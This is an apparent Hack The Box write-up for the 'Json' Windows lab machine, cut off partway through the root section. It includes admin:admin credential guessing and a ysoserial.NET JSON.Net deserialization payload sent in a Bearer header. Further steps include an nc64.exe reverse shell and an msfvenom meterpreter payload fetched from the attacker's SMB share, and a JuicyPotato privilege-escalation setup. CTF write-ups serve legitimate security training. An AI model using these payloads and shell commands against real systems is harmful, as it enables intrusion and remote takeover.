---
layout: single
title: Json - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2020-01-22
classes: wide
header:
  teaser: /assets/images/htb-writeup-json/json_logo.png
  teaser_home_page: true
  icon: /assets/images/windows.png
categories:
  - hackthebox
  - infosec
tags:  
  - windows
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-json/json_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


  ██╗   ██╗███████╗███████╗██████╗
  ██║   ██║██╔════╝██╔════╝██╔══██╗
  ██║   ██║███████╗█████╗  ██████╔╝
  ██║   ██║╚════██║██╔══╝  ██╔══██╗
  ╚██████╔╝███████║███████╗██║  ██║
   ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝

1. root@p3:/opt/htb/machines/json#nmapAutomatorDirb.sh 10.10.10.158 All
   PORT      STATE SERVICE      VERSION
   21/tcp    open  ftp          FileZilla ftpd
   | ftp-syst:
   |_  SYST: UNIX emulated by FileZilla
   80/tcp    open  http         Microsoft IIS httpd 8.5
   | http-methods:
   |_  Potentially risky methods: TRACE
   |_http-server-header: Microsoft-IIS/8.5
   |_http-title: Json HTB
   135/tcp   open  msrpc        Microsoft Windows RPC
   139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
   445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
   49152/tcp open  msrpc        Microsoft Windows RPC
   49153/tcp open  msrpc        Microsoft Windows RPC
   49154/tcp open  msrpc        Microsoft Windows RPC
   49155/tcp open  msrpc        Microsoft Windows RPC
   49156/tcp open  msrpc        Microsoft Windows RPC
   49157/tcp open  msrpc        Microsoft Windows RPC
   49158/tcp open  msrpc        Microsoft Windows RPC

   Host script results:
   |_clock-skew: mean: 4h00m26s, deviation: 0s, median: 4h00m26s
   |_nbstat: NetBIOS name: JSON, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:e7:01 (VMware)
   |_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
   | smb-security-mode:
   |   account_used: <blank>
   |   authentication_level: user
   |   challenge_response: supported
   |_  message_signing: disabled (dangerous, but default)
   | smb2-security-mode:
   |   2.02:
   |_    Message signing enabled but not required
   | smb2-time:
   |   date: 2020-01-23T11:41:50
   |_  start_date: 2020-01-22T22:01:06

   PORT    STATE SERVICE    VERSION
   137/udp open  netbios-ns Microsoft Windows netbios-ns (workgroup: WORKGROUP)

   Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

   ==> DIRECTORY: http://10.10.10.158/css/
   ==> DIRECTORY: http://10.10.10.158/files/
   ==> DIRECTORY: http://10.10.10.158/img/
   + http://10.10.10.158/index.html (CODE:200|SIZE:40163)
   ==> DIRECTORY: http://10.10.10.158/js/
   ==> DIRECTORY: http://10.10.10.158/views/

2. We are unable to get any unauthenticated information via rpcclient, smbclient or ftp. Visiting the webpage shows us a brief
  authenticated session, and then we are forwarded to the login page /login.html. The site is unsecure (http) and by looking at the
  js data we can identify that it uses OAuth2 and Bearer tokens. Looking further at app.min.js we find a few functions, '/api/token'
  and '/api/Account/'.

  Using curl we can try to get a bearer token, although it's a guessing game.

  root@p3:/opt/htb/machines/json# curl -v json.htb/api/token -H 'Accept: application/json' -H 'Content-Type: application/json' --data '{"UserName":"admin","Password":"password"}'
     *   Trying 10.10.10.158:80...
     * TCP_NODELAY set
     * Connected to json.htb (10.10.10.158) port 80 (#0)
     > POST /api/token HTTP/1.1
     > Host: json.htb
     > User-Agent: curl/7.67.0
     > Accept: application/json
     > Content-Type: application/json
     > Content-Length: 42
     >
     * upload completely sent off: 42 out of 42 bytes
     * Mark bundle as not supporting multiuse
     < HTTP/1.1 404 Not Found
     < Cache-Control: no-cache
     < Pragma: no-cache
     < Content-Type: application/json; charset=utf-8
     < Expires: -1
     < Server: Microsoft-IIS/8.5
     < X-AspNet-Version: 4.0.30319
     < X-Powered-By: ASP.NET
     < Date: Thu, 23 Jan 2020 13:31:23 GMT
     < Content-Length: 17
     <
     * Connection #0 to host json.htb left intact
     "User Not Exists"


  The Credentials admin:password doesn't work, however admin:admin do work and we get a base64 encrypted OAuth2 cookie.
   root@p3:/opt/htb/machines/json# curl -v json.htb/api/token -H 'Accept: application/json' -H 'Content-Type: application/json' --data '{"UserName":"admin","Password":"admin"}'
     *   Trying 10.10.10.158:80...
     * TCP_NODELAY set
     * Connected to json.htb (10.10.10.158) port 80 (#0)
     > POST /api/token HTTP/1.1
     > Host: json.htb
     > User-Agent: curl/7.67.0
     > Accept: application/json
     > Content-Type: application/json
     > Content-Length: 39
     >
     * upload completely sent off: 39 out of 39 bytes
     * Mark bundle as not supporting multiuse
     < HTTP/1.1 202 Accepted
     < Cache-Control: no-cache
     < Pragma: no-cache
     < Expires: -1
     < Server: Microsoft-IIS/8.5
     < X-AspNet-Version: 4.0.30319
     < Set-Cookie: OAuth2=eyJJZCI6MSwiVXNlck5hbWUiOiJhZG1pbiIsIlBhc3N3b3JkIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMiLCJOYW1lIjoiVXNlciBBZG1pbiBIVEIiLCJSb2wiOiJBZG1pbmlzdHJhdG9yIn0=; expires=Thu, 23-Jan-2020 13:34:52 GMT; path=/
     < X-Powered-By: ASP.NET
     < Date: Thu, 23 Jan 2020 13:32:52 GMT
     < Content-Length: 0
     <
     * Connection #0 to host json.htb left intact

   Decrypting the OAuth2 info gives us:
     {"Id":1,"UserName":"admin","Password":"21232f297a57a5a743894a0e4a801fc3","Name":"User Admin HTB","Rol":"Administrator"}

   Instead of decrypting the OAuth2 data, we could also send it as a Bearer token using the header option 'Bearer'. This would
   produce the same result.

   root@p3:/opt/htb/machines/json# curl -v 10.10.10.158/api/Account/ -H 'Accept: application/json' -H 'Content-Type: application/json' -H 'Bearer: eyJJZCI6MSwiVXNlck5hbWUiOiJhZG1pbiIsIlBhc3N3b3JkIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMiLCJOYW1lIjoiVXNlciBBZG1pbiBIVEIiLCJSb2wiOiJBZG1pbmlzdHJhdG9yIn0='
     *   Trying 10.10.10.158:80...
     * TCP_NODELAY set
     * Connected to 10.10.10.158 (10.10.10.158) port 80 (#0)
     > GET /api/Account/ HTTP/1.1
     > Host: 10.10.10.158
     > User-Agent: curl/7.67.0
     > Accept: application/json
     > Content-Type: application/json
     > Bearer: eyJJZCI6MSwiVXNlck5hbWUiOiJhZG1pbiIsIlBhc3N3b3JkIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMiLCJOYW1lIjoiVXNlciBBZG1pbiBIVEIiLCJSb2wiOiJBZG1pbmlzdHJhdG9yIn0=
     >
     * Mark bundle as not supporting multiuse
     < HTTP/1.1 200 OK
     < Cache-Control: no-cache
     < Pragma: no-cache
     < Content-Type: application/json; charset=utf-8
     < Expires: -1
     < Server: Microsoft-IIS/8.5
     < X-AspNet-Version: 4.0.30319
     < X-Powered-By: ASP.NET
     < Date: Thu, 23 Jan 2020 13:37:59 GMT
     < Content-Length: 119
     <
     * Connection #0 to host 10.10.10.158 left intact
     {"Id":1,"UserName":"admin","Password":"21232f297a57a5a743894a0e4a801fc3","Name":"User Admin HTB","Rol":"Administrator"}


3. As we can see in the response it is a .NET application and we can inject data in to the Bearer. Googling around there is an
  deserialization RCE attack possible using ysoserial.NET. To create our payload it's easiest using a windows box.

  We create a poc payload that will ping our localhost to verify functionality.

   > ysoserial.exe -g WindowsIdentity -f Json.Net -o base64 -c "ping 10.10.14.8" > rce-ping.txt

  Replace the legit Bearer data with our new created payload. Before executing the curl / Burp request setup tcpdump to confirm
  the incomming icmp from the victim machine.

  curl -v 10.10.10.158/api/Account/ -H 'Accept: application/json' -H 'Content-Type: application/json' -H 'Bearer: ewogICAgICAgICAgICAgICAgICAgICckdHlwZSc6ICdTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywKICAgICAgICAgICAgICAgICAgICAnU3lzdGVtLlNlY3VyaXR5LkNsYWltc0lkZW50aXR5LmJvb3RzdHJhcENvbnRleHQnOiAnQUFFQUFBRC8vLy8vQVFBQUFBQUFBQUFNQWdBQUFFbFRlWE4wWlcwc0lGWmxjbk5wYjI0OU5DNHdMakF1TUN3Z1EzVnNkSFZ5WlQxdVpYVjBjbUZzTENCUWRXSnNhV05MWlhsVWIydGxiajFpTnpkaE5XTTFOakU1TXpSbE1EZzVCUUVBQUFDRUFWTjVjM1JsYlM1RGIyeHNaV04wYVc5dWN5NUhaVzVsY21sakxsTnZjblJsWkZObGRHQXhXMXRUZVhOMFpXMHVVM1J5YVc1bkxDQnRjMk52Y214cFlpd2dWbVZ5YzJsdmJqMDBMakF1TUM0d0xDQkRkV3gwZFhKbFBXNWxkWFJ5WVd3c0lGQjFZbXhwWTB0bGVWUnZhMlZ1UFdJM04yRTFZelUyTVRrek5HVXdPRGxkWFFRQUFBQUZRMjkxYm5RSVEyOXRjR0Z5WlhJSFZtVnljMmx2YmdWSmRHVnRjd0FEQUFZSWpRRlRlWE4wWlcwdVEyOXNiR1ZqZEdsdmJuTXVSMlZ1WlhKcFl5NURiMjF3WVhKcGMyOXVRMjl0Y0dGeVpYSmdNVnRiVTNsemRHVnRMbE4wY21sdVp5d2diWE5qYjNKc2FXSXNJRlpsY25OcGIyNDlOQzR3TGpBdU1Dd2dRM1ZzZEhWeVpUMXVaWFYwY21Gc0xDQlFkV0pzYVdOTFpYbFViMnRsYmoxaU56ZGhOV00xTmpFNU16UmxNRGc1WFYwSUFnQUFBQUlBQUFBSkF3QUFBQUlBQUFBSkJBQUFBQVFEQUFBQWpRRlRlWE4wWlcwdVEyOXNiR1ZqZEdsdmJuTXVSMlZ1WlhKcFl5NURiMjF3WVhKcGMyOXVRMjl0Y0dGeVpYSmdNVnRiVTNsemRHVnRMbE4wY21sdVp5d2diWE5qYjNKc2FXSXNJRlpsY25OcGIyNDlOQzR3TGpBdU1Dd2dRM1ZzZEhWeVpUMXVaWFYwY21Gc0xDQlFkV0pzYVdOTFpYbFViMnRsYmoxaU56ZGhOV00xTmpFNU16UmxNRGc1WFYwQkFBQUFDMTlqYjIxd1lYSnBjMjl1QXlKVGVYTjBaVzB1UkdWc1pXZGhkR1ZUWlhKcFlXeHBlbUYwYVc5dVNHOXNaR1Z5Q1FVQUFBQVJCQUFBQUFJQUFBQUdCZ0FBQUJJdll5QndhVzVuSURFd0xqRXdMakUwTGpnR0J3QUFBQU5qYldRRUJRQUFBQ0pUZVhOMFpXMHVSR1ZzWldkaGRHVlRaWEpwWVd4cGVtRjBhVzl1U0c5c1pHVnlBd0FBQUFoRVpXeGxaMkYwWlFkdFpYUm9iMlF3QjIxbGRHaHZaREVEQXdNd1UzbHpkR1Z0TGtSbGJHVm5ZWFJsVTJWeWFXRnNhWHBoZEdsdmJraHZiR1JsY2l0RVpXeGxaMkYwWlVWdWRISjVMMU41YzNSbGJTNVNaV1pzWldOMGFXOXVMazFsYldKbGNrbHVabTlUWlhKcFlXeHBlbUYwYVc5dVNHOXNaR1Z5TDFONWMzUmxiUzVTWldac1pXTjBhVzl1TGsxbGJXSmxja2x1Wm05VFpYSnBZV3hwZW1GMGFXOXVTRzlzWkdWeUNRZ0FBQUFKQ1FBQUFBa0tBQUFBQkFnQUFBQXdVM2x6ZEdWdExrUmxiR1ZuWVhSbFUyVnlhV0ZzYVhwaGRHbHZia2h2YkdSbGNpdEVaV3hsWjJGMFpVVnVkSEo1QndBQUFBUjBlWEJsQ0dGemMyVnRZbXg1Qm5SaGNtZGxkQkowWVhKblpYUlVlWEJsUVhOelpXMWliSGtPZEdGeVoyVjBWSGx3WlU1aGJXVUtiV1YwYUc5a1RtRnRaUTFrWld4bFoyRjBaVVZ1ZEhKNUFRRUNBUUVCQXpCVGVYTjBaVzB1UkdWc1pXZGhkR1ZUWlhKcFlXeHBlbUYwYVc5dVNHOXNaR1Z5SzBSbGJHVm5ZWFJsUlc1MGNua0dDd0FBQUxBQ1UzbHpkR1Z0TGtaMWJtTmdNMXRiVTNsemRHVnRMbE4wY21sdVp5d2diWE5qYjNKc2FXSXNJRlpsY25OcGIyNDlOQzR3TGpBdU1Dd2dRM1ZzZEhWeVpUMXVaWFYwY21Gc0xDQlFkV0pzYVdOTFpYbFViMnRsYmoxaU56ZGhOV00xTmpFNU16UmxNRGc1WFN4YlUzbHpkR1Z0TGxOMGNtbHVaeXdnYlhOamIzSnNhV0lzSUZabGNuTnBiMjQ5TkM0d0xqQXVNQ3dnUTNWc2RIVnlaVDF1WlhWMGNtRnNMQ0JRZFdKc2FXTkxaWGxVYjJ0bGJqMWlOemRoTldNMU5qRTVNelJsTURnNVhTeGJVM2x6ZEdWdExrUnBZV2R1YjNOMGFXTnpMbEJ5YjJObGMzTXNJRk41YzNSbGJTd2dWbVZ5YzJsdmJqMDBMakF1TUM0d0xDQkRkV3gwZFhKbFBXNWxkWFJ5WVd3c0lGQjFZbXhwWTB0bGVWUnZhMlZ1UFdJM04yRTFZelUyTVRrek5HVXdPRGxkWFFZTUFBQUFTMjF6WTI5eWJHbGlMQ0JXWlhKemFXOXVQVFF1TUM0d0xqQXNJRU4xYkhSMWNtVTlibVYxZEhKaGJDd2dVSFZpYkdsalMyVjVWRzlyWlc0OVlqYzNZVFZqTlRZeE9UTTBaVEE0T1FvR0RRQUFBRWxUZVhOMFpXMHNJRlpsY25OcGIyNDlOQzR3TGpBdU1Dd2dRM1ZzZEhWeVpUMXVaWFYwY21Gc0xDQlFkV0pzYVdOTFpYbFViMnRsYmoxaU56ZGhOV00xTmpFNU16UmxNRGc1Qmc0QUFBQWFVM2x6ZEdWdExrUnBZV2R1YjNOMGFXTnpMbEJ5YjJObGMzTUdEd0FBQUFWVGRHRnlkQWtRQUFBQUJBa0FBQUF2VTNsemRHVnRMbEpsWm14bFkzUnBiMjR1VFdWdFltVnlTVzVtYjFObGNtbGhiR2w2WVhScGIyNUliMnhrWlhJSEFBQUFCRTVoYldVTVFYTnpaVzFpYkhsT1lXMWxDVU5zWVhOelRtRnRaUWxUYVdkdVlYUjFjbVVLVTJsbmJtRjBkWEpsTWdwTlpXMWlaWEpVZVhCbEVFZGxibVZ5YVdOQmNtZDFiV1Z1ZEhNQkFRRUJBUUFEQ0ExVGVYTjBaVzB1Vkhsd1pWdGRDUThBQUFBSkRRQUFBQWtPQUFBQUJoUUFBQUErVTNsemRHVnRMa1JwWVdkdWIzTjBhV056TGxCeWIyTmxjM01nVTNSaGNuUW9VM2x6ZEdWdExsTjBjbWx1Wnl3Z1UzbHpkR1Z0TGxOMGNtbHVaeWtHRlFBQUFENVRlWE4wWlcwdVJHbGhaMjV2YzNScFkzTXVVSEp2WTJWemN5QlRkR0Z5ZENoVGVYTjBaVzB1VTNSeWFXNW5MQ0JUZVhOMFpXMHVVM1J5YVc1bktRZ0FBQUFLQVFvQUFBQUpBQUFBQmhZQUFBQUhRMjl0Y0dGeVpRa01BQUFBQmhnQUFBQU5VM2x6ZEdWdExsTjBjbWx1WndZWkFBQUFLMGx1ZERNeUlFTnZiWEJoY21Vb1UzbHpkR1Z0TGxOMGNtbHVaeXdnVTNsemRHVnRMbE4wY21sdVp5a0dHZ0FBQURKVGVYTjBaVzB1U1c1ME16SWdRMjl0Y0dGeVpTaFRlWE4wWlcwdVUzUnlhVzVuTENCVGVYTjBaVzB1VTNSeWFXNW5LUWdBQUFBS0FSQUFBQUFJQUFBQUJoc0FBQUJ4VTNsemRHVnRMa052YlhCaGNtbHpiMjVnTVZ0YlUzbHpkR1Z0TGxOMGNtbHVaeXdnYlhOamIzSnNhV0lzSUZabGNuTnBiMjQ5TkM0d0xqQXVNQ3dnUTNWc2RIVnlaVDF1WlhWMGNtRnNMQ0JRZFdKc2FXTkxaWGxVYjJ0bGJqMWlOemRoTldNMU5qRTVNelJsTURnNVhWMEpEQUFBQUFvSkRBQUFBQWtZQUFBQUNSWUFBQUFLQ3c9PScKICAgICAgICAgICAgICAgIH0='

  root@p3:/opt/htb/machines/json# tcpdump -i tun0 icmp
   tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
   listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
   08:21:47.434315 IP json.htb > p3: ICMP echo request, id 1, seq 17, length 40
   08:21:47.434337 IP p3 > json.htb: ICMP echo reply, id 1, seq 17, length 40
   08:21:48.450946 IP json.htb > p3: ICMP echo request, id 1, seq 18, length 40
   08:21:48.450982 IP p3 > json.htb: ICMP echo reply, id 1, seq 18, length 40
   08:21:49.466503 IP json.htb > p3: ICMP echo request, id 1, seq 19, length 40
   08:21:49.466542 IP p3 > json.htb: ICMP echo reply, id 1, seq 19, length 40
   08:21:50.482371 IP json.htb > p3: ICMP echo request, id 1, seq 20, length 40
   08:21:50.482411 IP p3 > json.htb: ICMP echo reply, id 1, seq 20, length 40

   ICMP comming from json.htb > p3 confirms that the rce is working. We now need to militarize this to get user.


4. Just like normally I create the reverse shell executing nc64.exe from my smb share.
   > ysoserial.exe -g WindowsIdentity -f Json.Net -o base64 -c "\\10.10.14.8\pub-share\nc64.exe 10.10.14.8 4488 -e powershell" > rce-reverse.txt

  Running the newly created payload gives us a reverse connecting, however it halts. We are unable to do anything.

   root@p3:/opt/htb/machines/json# nc -lvnp 4488
     listening on [any] 4488 ...
     connect to [10.10.14.8] from (UNKNOWN) [10.10.10.158] 55376
     Windows PowerShell
     Copyright (C) 2014 Microsoft Corporation. All rights reserved.

  We need to create a new payload, this time lets use msfvenom to create a reverse meterpreter session.

  root@p3:/opt/htb/machines/json# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.8 LPORT=4400 -f exe > json-expl.exe
    [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
    [-] No arch selected, selecting arch: x64 from the payload
    No encoder or badchars specified, outputting raw payload
    Payload size: 510 bytes
    Final size of exe file: 7168 bytes

  Create a new (Bearer) execution using ysoserial to tigger the reverse meterpreter.
   > ysoserial.exe -g WindowsIdentity -f Json.Net -o base64 -c "\\10.10.14.8\pub-share\json-expl.exe" > rce-meterpreter.txt

  We now have the two components needed to get the shell. Start up msfdb exploit/multi/handler and use payload
  windows/x64/meterpreter/reverse_tcp to receive the reverse.

  root@p3:/srv/pub-share# curl -v 10.10.10.158/api/Account/ -H 'Accept: application/json' -H 'Content-Type: application/json' -H 'Bearer: ewogICAgICAgICAgICAgICAgICAgICckdHlwZSc6ICdTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywKICAgICAgICAgICAgICAgICAgICAnU3lzdGVtLlNlY3VyaXR5LkNsYWltc0lkZW50aXR5LmJvb3RzdHJhcENvbnRleHQnOiAnQUFFQUFBRC8vLy8vQVFBQUFBQUFBQUFNQWdBQUFFbFRlWE4wWlcwc0lGWmxjbk5wYjI0OU5DNHdMakF1TUN3Z1EzVnNkSFZ5WlQxdVpYVjBjbUZzTENCUWRXSnNhV05MWlhsVWIydGxiajFpTnpkaE5XTTFOakU1TXpSbE1EZzVCUUVBQUFDRUFWTjVjM1JsYlM1RGIyeHNaV04wYVc5dWN5NUhaVzVsY21sakxsTnZjblJsWkZObGRHQXhXMXRUZVhOMFpXMHVVM1J5YVc1bkxDQnRjMk52Y214cFlpd2dWbVZ5YzJsdmJqMDBMakF1TUM0d0xDQkRkV3gwZFhKbFBXNWxkWFJ5WVd3c0lGQjFZbXhwWTB0bGVWUnZhMlZ1UFdJM04yRTFZelUyTVRrek5HVXdPRGxkWFFRQUFBQUZRMjkxYm5RSVEyOXRjR0Z5WlhJSFZtVnljMmx2YmdWSmRHVnRjd0FEQUFZSWpRRlRlWE4wWlcwdVEyOXNiR1ZqZEdsdmJuTXVSMlZ1WlhKcFl5NURiMjF3WVhKcGMyOXVRMjl0Y0dGeVpYSmdNVnRiVTNsemRHVnRMbE4wY21sdVp5d2diWE5qYjNKc2FXSXNJRlpsY25OcGIyNDlOQzR3TGpBdU1Dd2dRM1ZzZEhWeVpUMXVaWFYwY21Gc0xDQlFkV0pzYVdOTFpYbFViMnRsYmoxaU56ZGhOV00xTmpFNU16UmxNRGc1WFYwSUFnQUFBQUlBQUFBSkF3QUFBQUlBQUFBSkJBQUFBQVFEQUFBQWpRRlRlWE4wWlcwdVEyOXNiR1ZqZEdsdmJuTXVSMlZ1WlhKcFl5NURiMjF3WVhKcGMyOXVRMjl0Y0dGeVpYSmdNVnRiVTNsemRHVnRMbE4wY21sdVp5d2diWE5qYjNKc2FXSXNJRlpsY25OcGIyNDlOQzR3TGpBdU1Dd2dRM1ZzZEhWeVpUMXVaWFYwY21Gc0xDQlFkV0pzYVdOTFpYbFViMnRsYmoxaU56ZGhOV00xTmpFNU16UmxNRGc1WFYwQkFBQUFDMTlqYjIxd1lYSnBjMjl1QXlKVGVYTjBaVzB1UkdWc1pXZGhkR1ZUWlhKcFlXeHBlbUYwYVc5dVNHOXNaR1Z5Q1FVQUFBQVJCQUFBQUFJQUFBQUdCZ0FBQUNjdll5QmNYREV3TGpFd0xqRTBMamhjY0hWaUxYTm9ZWEpsWEdwemIyNHRaWGh3YkM1bGVHVUdCd0FBQUFOamJXUUVCUUFBQUNKVGVYTjBaVzB1UkdWc1pXZGhkR1ZUWlhKcFlXeHBlbUYwYVc5dVNHOXNaR1Z5QXdBQUFBaEVaV3hsWjJGMFpRZHRaWFJvYjJRd0IyMWxkR2h2WkRFREF3TXdVM2x6ZEdWdExrUmxiR1ZuWVhSbFUyVnlhV0ZzYVhwaGRHbHZia2h2YkdSbGNpdEVaV3hsWjJGMFpVVnVkSEo1TDFONWMzUmxiUzVTWldac1pXTjBhVzl1TGsxbGJXSmxja2x1Wm05VFpYSnBZV3hwZW1GMGFXOXVTRzlzWkdWeUwxTjVjM1JsYlM1U1pXWnNaV04wYVc5dUxrMWxiV0psY2tsdVptOVRaWEpwWVd4cGVtRjBhVzl1U0c5c1pHVnlDUWdBQUFBSkNRQUFBQWtLQUFBQUJBZ0FBQUF3VTNsemRHVnRMa1JsYkdWbllYUmxVMlZ5YVdGc2FYcGhkR2x2YmtodmJHUmxjaXRFWld4bFoyRjBaVVZ1ZEhKNUJ3QUFBQVIwZVhCbENHRnpjMlZ0WW14NUJuUmhjbWRsZEJKMFlYSm5aWFJVZVhCbFFYTnpaVzFpYkhrT2RHRnlaMlYwVkhsd1pVNWhiV1VLYldWMGFHOWtUbUZ0WlExa1pXeGxaMkYwWlVWdWRISjVBUUVDQVFFQkF6QlRlWE4wWlcwdVJHVnNaV2RoZEdWVFpYSnBZV3hwZW1GMGFXOXVTRzlzWkdWeUswUmxiR1ZuWVhSbFJXNTBjbmtHQ3dBQUFMQUNVM2x6ZEdWdExrWjFibU5nTTF0YlUzbHpkR1Z0TGxOMGNtbHVaeXdnYlhOamIzSnNhV0lzSUZabGNuTnBiMjQ5TkM0d0xqQXVNQ3dnUTNWc2RIVnlaVDF1WlhWMGNtRnNMQ0JRZFdKc2FXTkxaWGxVYjJ0bGJqMWlOemRoTldNMU5qRTVNelJsTURnNVhTeGJVM2x6ZEdWdExsTjBjbWx1Wnl3Z2JYTmpiM0pzYVdJc0lGWmxjbk5wYjI0OU5DNHdMakF1TUN3Z1EzVnNkSFZ5WlQxdVpYVjBjbUZzTENCUWRXSnNhV05MWlhsVWIydGxiajFpTnpkaE5XTTFOakU1TXpSbE1EZzVYU3hiVTNsemRHVnRMa1JwWVdkdWIzTjBhV056TGxCeWIyTmxjM01zSUZONWMzUmxiU3dnVm1WeWMybHZiajAwTGpBdU1DNHdMQ0JEZFd4MGRYSmxQVzVsZFhSeVlXd3NJRkIxWW14cFkwdGxlVlJ2YTJWdVBXSTNOMkUxWXpVMk1Ua3pOR1V3T0RsZFhRWU1BQUFBUzIxelkyOXliR2xpTENCV1pYSnphVzl1UFRRdU1DNHdMakFzSUVOMWJIUjFjbVU5Ym1WMWRISmhiQ3dnVUhWaWJHbGpTMlY1Vkc5clpXNDlZamMzWVRWak5UWXhPVE0wWlRBNE9Rb0dEUUFBQUVsVGVYTjBaVzBzSUZabGNuTnBiMjQ5TkM0d0xqQXVNQ3dnUTNWc2RIVnlaVDF1WlhWMGNtRnNMQ0JRZFdKc2FXTkxaWGxVYjJ0bGJqMWlOemRoTldNMU5qRTVNelJsTURnNUJnNEFBQUFhVTNsemRHVnRMa1JwWVdkdWIzTjBhV056TGxCeWIyTmxjM01HRHdBQUFBVlRkR0Z5ZEFrUUFBQUFCQWtBQUFBdlUzbHpkR1Z0TGxKbFpteGxZM1JwYjI0dVRXVnRZbVZ5U1c1bWIxTmxjbWxoYkdsNllYUnBiMjVJYjJ4a1pYSUhBQUFBQkU1aGJXVU1RWE56WlcxaWJIbE9ZVzFsQ1VOc1lYTnpUbUZ0WlFsVGFXZHVZWFIxY21VS1UybG5ibUYwZFhKbE1ncE5aVzFpWlhKVWVYQmxFRWRsYm1WeWFXTkJjbWQxYldWdWRITUJBUUVCQVFBRENBMVRlWE4wWlcwdVZIbHdaVnRkQ1E4QUFBQUpEUUFBQUFrT0FBQUFCaFFBQUFBK1UzbHpkR1Z0TGtScFlXZHViM04wYVdOekxsQnliMk5sYzNNZ1UzUmhjblFvVTNsemRHVnRMbE4wY21sdVp5d2dVM2x6ZEdWdExsTjBjbWx1WnlrR0ZRQUFBRDVUZVhOMFpXMHVSR2xoWjI1dmMzUnBZM011VUhKdlkyVnpjeUJUZEdGeWRDaFRlWE4wWlcwdVUzUnlhVzVuTENCVGVYTjBaVzB1VTNSeWFXNW5LUWdBQUFBS0FRb0FBQUFKQUFBQUJoWUFBQUFIUTI5dGNHRnlaUWtNQUFBQUJoZ0FBQUFOVTNsemRHVnRMbE4wY21sdVp3WVpBQUFBSzBsdWRETXlJRU52YlhCaGNtVW9VM2x6ZEdWdExsTjBjbWx1Wnl3Z1UzbHpkR1Z0TGxOMGNtbHVaeWtHR2dBQUFESlRlWE4wWlcwdVNXNTBNeklnUTI5dGNHRnlaU2hUZVhOMFpXMHVVM1J5YVc1bkxDQlRlWE4wWlcwdVUzUnlhVzVuS1FnQUFBQUtBUkFBQUFBSUFBQUFCaHNBQUFCeFUzbHpkR1Z0TGtOdmJYQmhjbWx6YjI1Z01WdGJVM2x6ZEdWdExsTjBjbWx1Wnl3Z2JYTmpiM0pzYVdJc0lGWmxjbk5wYjI0OU5DNHdMakF1TUN3Z1EzVnNkSFZ5WlQxdVpYVjBjbUZzTENCUWRXSnNhV05MWlhsVWIydGxiajFpTnpkaE5XTTFOakU1TXpSbE1EZzVYVjBKREFBQUFBb0pEQUFBQUFrWUFBQUFDUllBQUFBS0N3PT0nCiAgICAgICAgICAgICAgICB9'

  msf5 exploit(multi/handler) > run
    [*] Started reverse TCP handler on 10.10.14.8:4400
    [*] Sending stage (206403 bytes) to 10.10.10.158
    [*] Meterpreter session 4 opened (10.10.14.8:4400 -> 10.10.10.158:55588) at 2020-01-24 09:18:51 +0100

  meterpreter > shell
   Process 2464 created.
   Channel 1 created.
   Microsoft Windows [Version 6.3.9600]
   (c) 2013 Microsoft Corporation. All rights reserved.

  c:\windows\system32\inetsrv> whoami
   json\userpool

5. Grab user.txt

   C:\Users\userpool\Desktop>type user.txt
     3445****************************


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

  ██████╗  ██████╗  ██████╗ ████████╗
  ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
  ██████╔╝██║   ██║██║   ██║   ██║
  ██╔══██╗██║   ██║██║   ██║   ██║
  ██║  ██║╚██████╔╝╚██████╔╝   ██║
  ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


1. Looking at our users privileges we notice that SeImpersonatePrivilege is enabled. This would allow us to use JuicyPotato
  for privilege escalation.

   c:\Program Files (x86)\FileZilla Server>whoami /priv

     PRIVILEGES INFORMATION
     ----------------------

     Privilege Name                Description                               State
     ============================= ========================================= ========
     SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
     SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
     SeAuditPrivilege              Generate security audits                  Disabled
     SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
     SeImpersonatePrivilege        Impersonate a client after authentication Enabled
     SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

2. Upload JuicyPotato.exe to the victim machine.
   C:\temp>copy \\10.10.14.8\pub-share\JuicyPotato.exe .

3. Create a malicious payload to execute a reverse shell.
